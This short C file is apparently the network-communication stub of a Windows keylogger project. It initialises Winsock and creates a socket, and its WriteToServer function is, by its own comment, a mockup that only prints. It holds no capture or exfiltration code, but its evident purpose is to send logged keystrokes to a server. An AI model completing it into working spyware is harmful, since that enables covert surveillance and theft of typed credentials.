#include "KeyLogger_clientCom.h"
#include <winsock2.h>
#include <stdio.h>

    WSADATA WSA;
SOCKET keylogServer;

/**
    Name startListeningClient

    Description: enable the server to write to t he socket  by calling
    a WSASartup to enable SOCKET communication, then initiate
    the socket. if the socket is established this function should
    return true, else this function should return false.
*/
bool startListeningClient()
{
    if (WSAStartup(MAKEWORD(2,2),&WSA) !=0)
    {
        return false;
    }
    keylogServer = socket(AF_INET,SOCK_STREAM,0);

    if (keylogServer == INVALID_SOCKET)
    {
        return false;
    }

return true;
}
/**
    Mockup the writeToServer function for further development at this point it is limited
    but will be developed further.

    Title WriteToServer
*/

bool WriteToServer(char* buffer)
{
    printf("%s", buffer);
    return true;
}

